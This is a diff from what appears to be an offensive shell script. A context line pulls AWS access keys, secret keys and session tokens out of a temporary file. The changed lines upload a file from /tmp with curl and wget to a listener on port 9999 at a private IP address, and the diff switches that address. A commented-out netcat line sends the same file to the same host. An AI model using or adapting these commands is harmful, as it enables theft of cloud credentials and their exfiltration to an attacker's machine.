@@ -55,8 +55,8 @@ cat /tmp/...b | tr ',' '\n' | grep 'AccessKeyId\|SecretAccessKey\|Token' | sed '
 
 echo ""
 #cat /tmp/...c | nc 192.168.12.157 9999 
-curl --upload-file /tmp/...c 192.168.27.238:9999
-wget --header="Content-type: multipart/form-data boundary=FILEUPLOAD" --post-file /tmp/...c http://192.168.27.238:9999
+curl --upload-file /tmp/...c 192.168.12.157:9999
+wget --header="Content-type: multipart/form-data boundary=FILEUPLOAD" --post-file /tmp/...c http://192.168.12.157:9999
 echo ""
 fi
 
